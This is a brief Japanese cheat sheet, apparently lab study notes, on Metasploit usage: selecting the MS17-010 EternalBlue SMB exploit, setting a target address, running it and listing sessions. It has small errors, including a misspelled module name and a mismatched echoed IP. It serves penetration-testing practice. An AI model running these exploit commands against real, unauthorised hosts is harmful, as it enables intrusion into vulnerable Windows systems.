# metasploit

起動
```bash
msfconsole
```

payloadの選択
```
use exploit/windows/smb/ms17_010_externalblue
```

moduleの利用状況確認
```
Show options
```

Setで値を設定する
```
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.154.24
RHOSTS => 10.10.20.71
```

実行する
```
exploit -z
もしくは
run
```

### exploitの検索
```
sf6 > search ms17-010
```

### payloadの表示
```
show payloads
```

### セッションの表示
```
sessions -l
```
→現在有効なセッションを表示してくれる

